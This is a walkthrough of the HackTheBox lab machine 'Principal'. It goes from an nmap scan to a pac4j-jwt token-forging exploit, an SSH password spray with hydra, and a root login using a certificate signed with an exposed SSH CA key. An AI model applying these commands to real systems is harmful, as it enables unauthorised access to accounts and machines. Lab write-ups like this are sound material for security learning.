# **Principal - HackTheBox**

*Target Ip. Address: 10.129.253.255*

Let's start with the nmap scan.

```bash
kali@kali:nmap -sV -sC 10.129.253.255
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-13 02:14 +0000
Nmap scan report for 10.129.253.255
Host is up (0.23s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b0:a0:ca:46:bc:c2:cd:7e:10:05:05:2a:b8:c9:48:91 (ECDSA)
|_  256 e8:a4:9d:bf:c1:b6:2a:37:93:40:d0:78:00:f5:5f:d9 (ED25519)
8080/tcp open  http-proxy Jetty
| http-title: Principal Internal Platform - Login
|_Requested resource was /login
|_http-server-header: Jetty
|_http-open-proxy: Proxy might be redirecting requests
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Date: Fri, 13 Mar 2026 02:16:33 GMT
|     Server: Jetty
|     X-Powered-By: pac4j-jwt/6.0.3
|     Cache-Control: must-revalidate,no-cache,no-store
|     Content-Type: application/json
|     {"timestamp":"2026-03-13T02:16:33.896+00:00","status":404,"error":"Not Found","path":"/nice%20ports%2C/Tri%6Eity.txt%2ebak"}
|   GetRequest: 
|     HTTP/1.1 302 Found
|     Date: Fri, 13 Mar 2026 02:16:32 GMT
|     Server: Jetty
|     X-Powered-By: pac4j-jwt/6.0.3
|     Content-Language: en
|     Location: /login
|     Content-Length: 0
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Fri, 13 Mar 2026 02:16:33 GMT
|     Server: Jetty
|     X-Powered-By: pac4j-jwt/6.0.3
|     Allow: GET,HEAD,OPTIONS
|     Accept-Patch: 
|     Content-Length: 0                                                                                                                                      
|   RTSPRequest:                                                                                                                                             
|     HTTP/1.1 505 HTTP Version Not Supported                                                                                                                
|     Date: Fri, 13 Mar 2026 02:16:33 GMT                                                                                                                    
|     Cache-Control: must-revalidate,no-cache,no-store                                                                                                       
|     Content-Type: text/html;charset=iso-8859-1                                                                                                             
|     Content-Length: 349                                                                                                                                    
|     <html>                                                                                                                                                 
|     <head>                                                                                                                                                 
|     <meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1"/>                                                                               
|     <title>Error 505 Unknown Version</title>                                                                                                               
|     </head>                                                                                                                                                
|     <body>                                                                                                                                                 
|     <h2>HTTP ERROR 505 Unknown Version</h2>                                                                                                                
|     <table>                                                                                                                                                
|     <tr><th>URI:</th><td>/badMessage</td></tr>
|     <tr><th>STATUS:</th><td>505</td></tr>
|     <tr><th>MESSAGE:</th><td>Unknown Version</td></tr>
|     </table>
|     </body>
|     </html>
|   Socks5: 
|     HTTP/1.1 400 Bad Request
|     Date: Fri, 13 Mar 2026 02:16:34 GMT
|     Cache-Control: must-revalidate,no-cache,no-store
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 382
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1"/>
|     <title>Error 400 Illegal character CNTL=0x5</title>
|     </head>
|     <body>
|     <h2>HTTP ERROR 400 Illegal character CNTL=0x5</h2>
|     <table>
|     <tr><th>URI:</th><td>/badMessage</td></tr>
|     <tr><th>STATUS:</th><td>400</td></tr>
|     <tr><th>MESSAGE:</th><td>Illegal character CNTL=0x5</td></tr>
|     </table>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.98%I=7%D=3/13%Time=69B372FA%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,A4,"HTTP/1\.1\x20302\x20Found\r\nDate:\x20Fri,\x2013\x20Mar\x2
SF:02026\x2002:16:32\x20GMT\r\nServer:\x20Jetty\r\nX-Powered-By:\x20pac4j-
SF:jwt/6\.0\.3\r\nContent-Language:\x20en\r\nLocation:\x20/login\r\nConten
SF:t-Length:\x200\r\n\r\n")%r(HTTPOptions,A2,"HTTP/1\.1\x20200\x20OK\r\nDa
SF:te:\x20Fri,\x2013\x20Mar\x202026\x2002:16:33\x20GMT\r\nServer:\x20Jetty
SF:\r\nX-Powered-By:\x20pac4j-jwt/6\.0\.3\r\nAllow:\x20GET,HEAD,OPTIONS\r\
SF:nAccept-Patch:\x20\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,220,
SF:"HTTP/1\.1\x20505\x20HTTP\x20Version\x20Not\x20Supported\r\nDate:\x20Fr
SF:i,\x2013\x20Mar\x202026\x2002:16:33\x20GMT\r\nCache-Control:\x20must-re
SF:validate,no-cache,no-store\r\nContent-Type:\x20text/html;charset=iso-88
SF:59-1\r\nContent-Length:\x20349\r\n\r\n<html>\n<head>\n<meta\x20http-equ
SF:iv=\"Content-Type\"\x20content=\"text/html;charset=ISO-8859-1\"/>\n<tit
SF:le>Error\x20505\x20Unknown\x20Version</title>\n</head>\n<body>\n<h2>HTT
SF:P\x20ERROR\x20505\x20Unknown\x20Version</h2>\n<table>\n<tr><th>URI:</th
SF:><td>/badMessage</td></tr>\n<tr><th>STATUS:</th><td>505</td></tr>\n<tr>
SF:<th>MESSAGE:</th><td>Unknown\x20Version</td></tr>\n</table>\n\n</body>\
SF:n</html>\n")%r(FourOhFourRequest,13B,"HTTP/1\.1\x20404\x20Not\x20Found\
SF:r\nDate:\x20Fri,\x2013\x20Mar\x202026\x2002:16:33\x20GMT\r\nServer:\x20
SF:Jetty\r\nX-Powered-By:\x20pac4j-jwt/6\.0\.3\r\nCache-Control:\x20must-r
SF:evalidate,no-cache,no-store\r\nContent-Type:\x20application/json\r\n\r\
SF:n{\"timestamp\":\"2026-03-13T02:16:33\.896\+00:00\",\"status\":404,\"er
SF:ror\":\"Not\x20Found\",\"path\":\"/nice%20ports%2C/Tri%6Eity\.txt%2ebak
SF:\"}")%r(Socks5,232,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nDate:\x20Fri,
SF:\x2013\x20Mar\x202026\x2002:16:34\x20GMT\r\nCache-Control:\x20must-reva
SF:lidate,no-cache,no-store\r\nContent-Type:\x20text/html;charset=iso-8859
SF:-1\r\nContent-Length:\x20382\r\n\r\n<html>\n<head>\n<meta\x20http-equiv
SF:=\"Content-Type\"\x20content=\"text/html;charset=ISO-8859-1\"/>\n<title
SF:>Error\x20400\x20Illegal\x20character\x20CNTL=0x5</title>\n</head>\n<bo
SF:dy>\n<h2>HTTP\x20ERROR\x20400\x20Illegal\x20character\x20CNTL=0x5</h2>\
SF:n<table>\n<tr><th>URI:</th><td>/badMessage</td></tr>\n<tr><th>STATUS:</
SF:th><td>400</td></tr>\n<tr><th>MESSAGE:</th><td>Illegal\x20character\x20
SF:CNTL=0x5</td></tr>\n</table>\n\n</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.04 seconds
```

So, we have 2 open ports. Port 22 (ssh) and Port 8080 (http).

The thing to note is we have a version detected in nmap scan --> X-Powered-By: pac4j-jwt/6.0.3

Let's head to webiste at port 8080.

CVE-2026-29000 --> pac4j-jwt Authentication Bypass

You can find exploit here: *"https://github.com/manbahadurthapa1248/CVE-2026-29000---pac4j-jwt-Authentication-Bypass-PoC"*.

```bash
kali@kali:python3 exploit.py http://10.129.253.255:8080

[*] Fetching JWKS...
[+] Got RSA public key (kid: enc-key-1)
[*] Crafted PlainJWT with sub=admin, role=ROLE_ADMIN
[+] Forged JWE token created

[*] Accessing /api/dashboard...
[+] Status: 200
[+] Authenticated as: admin (ROLE_ADMIN)
[+] Token: eyJhbGciOiAiUlN_........D4zwSEY05lFkCB.J933HR-irY6a0r2uivRLZw
```

Puth the forged token in session storage with key as 'auth_token'.

Refreshing the login page will redirect to admin dashboard.

<img width="1249" height="947" alt="image" src="https://github.com/user-attachments/assets/87be3c88-a693-433e-ba7a-ddca87bf74fc" />

Looking further we find encryption key, which is possibly a ssh password.

<img width="1250" height="947" alt="Screenshot 2026-03-13 083414" src="https://github.com/user-attachments/assets/e3a09345-a65a-4311-b6a0-0da185149e64" />

We also have list of usernames, let's see if password spraying works.

<img width="1247" height="947" alt="image" src="https://github.com/user-attachments/assets/a4c77eed-4b29-45e7-a105-8c41be77a449" />

```bash
kali@kali:hydra -L users.txt -p 'D3...2!' ssh://10.129.253.255                                                                                       
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).                                                                                                   
                                                                                                                                                         
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-13 02:55:41                                                                       
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4                                    
[DATA] max 8 tasks per 1 server, overall 8 tasks, 8 login tries (l:8/p:1), ~1 try per task                                                               
[DATA] attacking ssh://10.129.253.255:22/                                                                                                                
[22][ssh] host: 10.129.253.255   login: svc-deploy   password: D3...2!                                                                         
1 of 1 target successfully completed, 1 valid password found                                                                                             
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-13 02:55:48
```

That was successful. Let;s login via ssh.

```bash
kali@kali:ssh svc-deploy@10.129.253.255
The authenticity of host '10.129.253.255 (10.129.253.255)' can't be established.
ED25519 key fingerprint is: SHA256:ibvdsZXiwJ6QUMPTxoH3spRA8hV9mbd98MLpLt3XG/E
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.253.255' (ED25519) to the list of known hosts.
svc-deploy@10.129.253.255's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

svc-deploy@principal:~$ 
```

We find our first flag.

```bash
svc-deploy@principal:~$ cat user.txt
45.....83
```

In earlier settigs page of the website, we had noticed something on notes.

<img width="1250" height="947" alt="Screenshot 2026-03-13 083414" src="https://github.com/user-attachments/assets/7f527356-47e3-44e3-9e6e-deb716ab3dcd" />

Let's see what is there.

```bash
svc-deploy@principal:/opt/principal/ssh$ ls
README.txt  ca  ca.pub
```

We have some keys and a Readme file.

```bash
svc-deploy@principal:/opt/principal/ssh$ cat README.txt 
CA keypair for SSH certificate automation.

This CA is trusted by sshd for certificate-based authentication.
Use deploy.sh to issue short-lived certificates for service accounts.

Key details:
  Algorithm: RSA 4096-bit
  Created: 2025-11-15
  Purpose: Automated deployment authenticatio
```

Since this CA file is trusted, we can forge a ssh-key for root login.

First, generate a key pair using Algorithm: RSA 4096-bit.

```bash
svc-deploy@principal:/opt/principal/ssh$ ssh-keygen -t rsa -b 4096 -f /tmp/my_temp_key -N ""
Generating public/private rsa key pair.
Your identification has been saved in /tmp/my_temp_key
Your public key has been saved in /tmp/my_temp_key.pub
The key fingerprint is:
SHA256:leze47vguZiKFIs/e5I5G/7WI9On30pPskCLibsXaPk svc-deploy@principal
The key's randomart image is:
+---[RSA 4096]----+
|                 |
|         . .     |
|          +      |
|         o       |
|    .o  S .      |
|   .++.+ o .     |
|  ..=+o+o = +    |
|   +*+E +*.X .   |
|    O%o++=Bo*o   |
+----[SHA256]-----+
```

Change the permissions on CA key.

```bash
svc-deploy@principal:/opt/principal/ssh$ cp ca /tmp/ca
svc-deploy@principal:/opt/principal/ssh$ chmod 600 /tmp/ca
```

Now, sign it with the CA file we have.

```bash
svc-deploy@principal:/opt/principal/ssh$ ssh-keygen -s /tmp/ca -I "PrivEsc_Audit" -n root -V +1h /tmp/my_temp_key.pub 
Signed user key /tmp/my_temp_key-cert.pub: id "PrivEsc_Audit" serial 0 for root valid from 2026-03-13T03:12:00 to 2026-03-13T04:13:15
```

Chamge permissions on public key, and login as root.

```bash
svc-deploy@principal:/opt/principal/ssh$ chmod 600 /tmp/my_temp_key

svc-deploy@principal:/opt/principal/ssh$ ssh -i /tmp/my_temp_key root@localhost
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Fri Mar 13 03:03:11 2026 from 10.10.14.23
root@principal:~# id
uid=0(root) gid=0(root) groups=0(root)
```

That was successful. Let's read the final flag and end this challenge.

```bash
root@principal:~# cat root.txt
4c.....2f
```
